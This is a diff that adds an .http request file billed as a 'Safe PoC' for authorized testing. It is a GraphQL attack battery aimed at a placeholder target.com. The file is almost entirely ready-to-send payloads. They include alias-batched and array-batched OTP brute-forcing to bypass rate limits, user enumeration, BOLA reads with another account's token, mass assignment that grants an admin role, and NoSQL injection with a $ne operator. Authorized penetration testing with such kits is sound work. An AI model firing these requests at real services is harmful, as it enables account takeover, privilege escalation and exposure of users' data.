@@ -1,0 +1,58 @@
+###
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# GraphQL batching rate-limit bypass battery (.http format).
+# Authorized testing only. WHAT TO EDIT: target.com + endpoint + real field
+# names from introspection. Measured-count discipline (GQL kit row 008).
+# ============================================================================
+
+### 1) confirm GraphQL + fingerprint
+POST https://target.com/graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"query":"{__typename}"}
+
+### 2) alias-batched OTP brute (N ops in ONE request where limit is 1/5)
+POST https://target.com/graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"query":"mutation{ a:verifyOtp(userId:\"MINE\",code:\"000000\"){token} b:verifyOtp(userId:\"MINE\",code:\"000001\"){token} c:verifyOtp(userId:\"MINE\",code:\"000002\"){token} d:verifyOtp(userId:\"MINE\",code:\"000003\"){token} }"}
+
+### 3) JSON-array batching (if engine accepts operation arrays)
+POST https://target.com/graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+[{"query":"mutation{verifyOtp(userId:\"MINE\",code:\"000000\"){token}}"},{"query":"mutation{verifyOtp(userId:\"MINE\",code:\"000001\"){token}}"}]
+
+### 4) alias enumeration (many objects, one request - BOLA scale proof)
+POST https://target.com/graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"query":"{ a:user(id:1){id} b:user(id:2){id} c:user(id:3){id} d:user(id:4){id} }"}
+
+### 5) BOLA via node(id) - A's token, B's id (two-account proof)
+POST https://target.com/graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Authorization: Bearer A_TOKEN
+
+{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email } } }"}
+
+### 6) mass-assignment via input object (read back after!)
+POST https://target.com/graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Authorization: Bearer A_TOKEN
+
+{"query":"mutation{ updateUser(input:{ id:ME, role:\"admin\", isAdmin:true }){ id role } }"}
+
+### 7) NoSQLi via typed JSON variable
+POST https://target.com/graphql HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"query":"query($id:JSON){ user(id:$id){email} }","variables":{"id":{"$ne":null}}}
